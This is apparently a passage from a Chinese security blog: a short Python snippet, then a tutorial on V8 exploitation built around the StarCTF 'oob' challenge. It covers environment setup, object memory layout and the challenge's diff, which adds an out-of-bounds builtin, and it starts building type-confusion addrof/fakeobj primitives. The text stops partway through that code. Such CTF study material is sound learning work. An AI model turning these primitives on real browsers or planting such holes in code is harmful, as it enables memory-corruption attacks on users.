          <a href="#2-获取本IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-获取本IP" class="headerlink" title="(2)获取本IP"></a>(2)获取本IP</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_self_ip</span>():</span></span><br><span class="line">    <span class="keyword">global</span> netD_name</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="keyword">return</span> socket.inet_ntoa(fcntl.ioctl(s.fileno(), <span class="number">0x8915</span>, struct.pack(<span class="string">&#x27;256s&#x27;</span>, <span class="built_in">bytes</span>(netD_name[:<span class="number">15</span>],<span class="string">&#x27;utf-8&#x27;</span>)))[<span class="number">20</span>:<span class="number">24</span>])</span><br><span class="line">self_ip = get_self_ip()</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-从stdout获取输出"   >
          <a href="#3-从stdout获取输出" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-从stdout获取输出" class="headerlink" title="(3)从stdout获取输出"></a>(3)从stdout获取输出</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_conten_from_stdout</span>(<span class="params">self,func</span>):</span></span><br><span class="line">    sys.stdout = string_io = StringIO()</span><br><span class="line">    func()</span><br><span class="line">    sys.stdout = self._stdout</span><br><span class="line">    print_str = string_io.getvalue()</span><br><span class="line">    <span class="keyword">del</span> string_io</span><br><span class="line">    <span class="keyword">return</span> print_str</span><br><span class="line"></span><br><span class="line">print_str = self.get_conten_from_stdout(pkt.show)</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/01/V8%E4%BB%8E0%E5%BC%80%E5%A7%8B/">V8从0开始</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、环境搭建"   >
          <a href="#一、环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1>
      <p>参照[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268933.htm#msg_header_h1_5" >原创]v8利用初探 2019 StarCTF oob 复现分析-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-代理设置"   >
          <a href="#1-代理设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-代理设置" class="headerlink" title="1.代理设置"></a>1.代理设置</h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://ip:port</span><br><span class="line"><span class="built_in">export</span> &#123;http,https&#125;_proxy=<span class="string">&quot;http://ip:port&quot;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="2-代码下载"   >
          <a href="#2-代码下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-代码下载" class="headerlink" title="2.代码下载"></a>2.代码下载</h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/pathto/depot_tools:<span class="variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="comment">#获取v8源码</span></span><br><span class="line">fetch v8</span><br><span class="line"><span class="comment">#切换题目对应版本的commit</span></span><br><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line"><span class="comment"># 工具同步</span></span><br><span class="line">gclient sync</span><br><span class="line"><span class="comment">#应用题目的补丁文件</span></span><br><span class="line"><span class="comment">#一般而言出题都是人为给某个版本的v8加一个洞上去，所以用题目给的diff文件给引擎加洞</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line"></span><br><span class="line"><span class="comment">#有的老版本最好还是用python2来编译，不然语法可能会出错</span></span><br><span class="line"><span class="comment"># 编译release版本</span></span><br><span class="line"><span class="comment">#测试exp用release版本，用debug版本测试通常会出错</span></span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译debug版本</span></span><br><span class="line"><span class="comment">#调试用debug版本</span></span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></div></figure>






        <h1 id="二、前置知识"   >
          <a href="#二、前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html" >从一道CTF题零基础学V8漏洞利用 - FreeBuf网络安全行业门户</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-调试知识"   >
          <a href="#1-调试知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-调试知识" class="headerlink" title="1.调试知识"></a>1.调试知识</h2>
      <p>需要注意的是debug版本的用来辅助显示，直接是没办法运行相关代码的，realse用来实际运行。</p>

        <h3 id="1-工具"   >
          <a href="#1-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-工具" class="headerlink" title="(1)工具"></a>(1)工具</h3>
      <p>常见的pwndbg，可以搭配如下的小工具</p>
<p>源码的<code>/pathto/v8/tools</code>目录下有专门用来调试v8的gdbinit，加在<code>~/.gdbinit</code>中即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /pathto/v8/tools/gdbinit</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-函数"   >
          <a href="#2-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-函数" class="headerlink" title="(2)函数"></a>(2)函数</h3>
      <p>在运行./d8时加入<code>--allow-natives-syntax</code>选项，可以使用一些调试函数</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax</span><br><span class="line"><span class="comment">#或者配合gdb</span></span><br><span class="line">gdb ./d8</span><br><span class="line"><span class="built_in">set</span> args --allow-natives-syntax ./test.js</span><br><span class="line">r</span><br></pre></td></tr></table></div></figure>

<p>如下函数</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) <span class="comment">//输出对象地址</span></span><br><span class="line">%SystemBreak() <span class="comment">//触发调试中断主要结合gdb等调试器使用，类似于python中的dbg()断点</span></span><br></pre></td></tr></table></div></figure>

<p>示例代码如下：</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="2-基础知识"   >
          <a href="#2-基础知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-基础知识" class="headerlink" title="2.基础知识"></a>2.基础知识</h2>
      
        <h3 id="1-对象内存讲解"   >
          <a href="#1-对象内存讲解" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-对象内存讲解" class="headerlink" title="(1)对象内存讲解"></a>(1)对象内存讲解</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></div></figure>

<p>比如如下定义数组对象a，那么运行<code>%DebugPrint(a);</code>得到地址后，使用job命令可以看到如下的内存布局</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012217111.png" alt="image-20220301220834343"></p>
<p>v8在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。因此上图该对象的实际内存地址应该为(0x346b7364dde9-1=<strong>0x346b7364dde8</strong>)</p>
<p>而对于数组对象则大致如下布局</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="center">map</th>
<th align="center">表明了一个对象的类型对象，上图即为PACKED_SMI_ELEMENTS</th>
</tr>
</thead>
<tbody><tr>
<td align="center">prototype</td>
<td align="center">prototype</td>
</tr>
<tr>
<td align="center">elements</td>
<td align="center">对象元素</td>
</tr>
<tr>
<td align="center">length</td>
<td align="center">元素个数</td>
</tr>
<tr>
<td align="center">properties</td>
<td align="center">属性</td>
</tr>
</tbody></table></div>
<p>而对于其中的elements元素也是一个对象，且地址位于对象a的上方，能看到里面的内容，也就是说先申请的elements这个元素内存，然后再申请的数组对象a</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012221043.png" alt="image-20220301222151967"></p>
<p>那么总的内存布局如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elements     ----&gt; +------------------------+</span><br><span class="line">                   |          MAP           +&lt;---------+</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>

<p>其他类型的对象都有些类似，可以自己去尝试看看</p>
<p>其中也不一定元素后面就跟的是<code>ArrayObject</code>的内容，也可能中间间隔了很多东西，比如如下情形，<code>elements</code>的地址和<code>ArrayObject</code>的地址差的还是挺大的，可能是内存分配上的一些问题吧?不太懂v8的内存分配是怎么实现的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182051776.png" alt="image-20220318205130634"></p>

        <h3 id="2-不同对象类型内存分布"   >
          <a href="#2-不同对象类型内存分布" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-不同对象类型内存分布" class="headerlink" title="(2)不同对象类型内存分布"></a>(2)不同对象类型内存分布</h3>
      
        <h4 id="①数组对象"   >
          <a href="#①数组对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#①数组对象" class="headerlink" title="①数组对象"></a>①数组对象</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br></pre></td></tr></table></div></figure>

<p>如下内存布局</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elements     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |          MAP           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>

<p>double或者float的数组也相似，就是map的类型为<code>PACKED_DOUBLE_ELEMENTS</code></p>

        <h4 id="②对象数组对象"   >
          <a href="#②对象数组对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#②对象数组对象" class="headerlink" title="②对象数组对象"></a>②对象数组对象</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objectArray = [a, b];<span class="comment">//a,b为对象</span></span><br></pre></td></tr></table></div></figure>

<p>即数组里存放的是对象，也是类似的，就是在elements中会有点不一样，相当于存放一个指针指向包含的对象，包括map的类型也不同，为<code>PACKED_ELEMENTS</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012230225.png" alt="image-20220301223028101"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">elementA     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |         MAP            +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |       Length           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line">elementB     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |         MAP            +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |       Length           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-类型混淆"   >
          <a href="#3-类型混淆" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-类型混淆" class="headerlink" title="(3)类型混淆"></a>(3)类型混淆</h3>
      <p>即当我们能够修改<code>ArrayObject</code>的map属性时，就能够造成类型混淆。比如</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array[<span class="number">4</span>];<span class="comment">//假设可以越界将float_array的map属性的值读出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设可以越界写obj_array的map属性，修改为浮点数数组的map属性的值</span></span><br><span class="line">obj_array[<span class="number">1</span>] = float_array_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于obj_array的map属性被修改为浮点数数组的map属性</span></span><br><span class="line"><span class="comment">//那么此时当js去解析的时候，就会把obj_array[0]当作一个浮点数</span></span><br><span class="line"><span class="comment">//从而能够读出obj_array[0]的地址,即obj的地址</span></span><br><span class="line"><span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]);<span class="comment">//f2i为浮点转无符号整数函数</span></span><br></pre></td></tr></table></div></figure>

<p>同样的，当我们能够修改把一个浮点数数组的map属性改为对象数组的map属性时，就能够使得v8认为该浮点数数组中的浮点数实际是一个对象，而我们控制数组中的变量的值为一个地址，这样就能将一个任意地址转化为一个obj对象了。</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array[<span class="number">1</span>];<span class="comment">//假设可以越界将obj_array的map属性的值读出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设可以越界写float_array的map属性，修改为obj_array的map属性的值</span></span><br><span class="line">float_array[<span class="number">4</span>] = obj_array_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于float_array的map属性被修改为对象数组的map属性</span></span><br><span class="line"><span class="comment">//那么此时当js去解析的时候，就会把float_array[0]当作一个对象</span></span><br><span class="line"><span class="comment">//从而能够伪造任意地址为一个虚假的对象</span></span><br><span class="line">fake_obj_addr = i2f(<span class="number">0x111111</span>);<span class="comment">//i2f为整数转浮点数</span></span><br><span class="line">float_array[<span class="number">0</span>] = fake_obj_addr;</span><br><span class="line"><span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取该虚假对象</span></span><br></pre></td></tr></table></div></figure>




        <h1 id="三、实际题目"   >
          <a href="#三、实际题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、实际题目" class="headerlink" title="三、实际题目"></a>三、实际题目</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://4hou.win/wordpress/?p=32405" >从一道CTF题零基础学V8漏洞利用 – backup (4hou.win)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-题目分析"   >
          <a href="#1-题目分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2>
      <p>添加的diff如下，主要是一下两部分，其他部分加入的就只是为了正常运行而已</p>
<figure class="highlight diff"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#以下两部分只是为了能正常运行这个添加的函数而已</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)        \</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br></pre></td></tr></table></div></figure>

<p>即添加了为数组对象<code>ArrayOob</code>添加了一个函数oob()，其功能为</p>
<ul>
<li>当参数只有一个(默认传入this指针)，返回数组最后一个元素之后的元素</li>
<li>当参数有两个(除了this指针之外再传入一个参数)，就用我们传入的参数覆盖数组最后一个元素之后的元素</li>
<li>其他情况下返回一个undefined</li>
</ul>
<p>即该函数可以实现<strong>读/写</strong>数组对象MAP属性</p>

        <h2 id="2-漏洞分析"   >
          <a href="#2-漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2>
      <p>关键在于数组对象<code>ArrayOob</code>的内存空间，尝试看一下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line">%DebugPrint(float_array);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></div></figure>

<p>调试跑起来，查看elements处的内存</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182013498.png" alt="image-20220318201300196"></p>
<p>即在数组对象的元素之后为数组对象的结构体，之前也提到过。而对象的map如果能被修改，就能引起v8的类型混淆，之前已经提到过。</p>
<p>那么我们利用类型混淆，来构造获取任意对象的地址的函数<code>getAddress(obj)</code>以及修改任意地址为对象的函数<code>getFakeObj(addr)</code></p>

        <h3 id="1-构造转化函数"   >
          <a href="#1-构造转化函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-构造转化函数" class="headerlink" title="(1)构造转化函数"></a>(1)构造转化函数</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array.oob()</span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array.oob()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAddress</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span 